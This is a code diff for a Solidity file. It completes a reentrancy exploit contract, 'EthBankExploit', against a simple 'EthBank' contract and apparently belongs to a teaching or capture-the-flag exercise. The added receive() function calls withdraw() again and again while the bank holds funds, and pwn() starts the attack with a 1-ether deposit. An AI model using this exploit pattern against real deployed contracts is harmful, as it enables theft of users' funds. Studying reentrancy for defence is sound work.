@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.2;
+pragma solidity ^0.8.20;
 
 contract EthBank {
     mapping(address => uint256) public balances;
@@ -16,7 +16,6 @@ contract EthBank {
     }
 }
 
-
 interface IEthBank {
     function deposit() external payable;
     function withdraw() external payable;
@@ -25,19 +24,18 @@ interface IEthBank {
 contract EthBankExploit {
     IEthBank public bank;
 
-    receive() external payable {}
     constructor(address _bank) {
         bank = IEthBank(_bank);
     }
 
+    receive() external payable {
+        if (address(bank).balance >= 1 ether) {
+            bank.withdraw();
+        }
+    }
+
     function pwn() external payable {
-        (bool sent, ) = address(bank).call{value: getBalance()}("");
-        
-
+        bank.deposit{value: 1 ether}();
+        bank.withdraw();
     }
-
-    function getBalance() public view returns (uint) {
-        return address(bank).balance;
-    }
-
 }
